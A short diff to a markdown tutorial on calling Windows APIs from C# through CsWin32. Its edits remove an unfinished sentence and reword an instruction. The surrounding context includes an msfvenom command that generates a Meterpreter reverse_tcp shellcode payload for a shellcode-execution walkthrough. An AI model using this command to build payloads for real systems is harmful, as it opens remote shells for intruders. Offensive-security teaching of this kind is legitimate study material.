@@ -130,12 +130,10 @@ dotnet add package System.Runtime.CompilerServices.Unsafe
 
 ![](Images/Coding/CsWin32InsteadOfPInvoke/CsWin32-Analyzers.png)
 
-From here, the arguments for the function calls need to be properly 
-
 
 ### Execution
 
-We can start by creating some shellcode with msfvenom.
+Start by creating some shellcode with msfvenom.
 
 ```bash
 ❯ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=9001 -f csharp
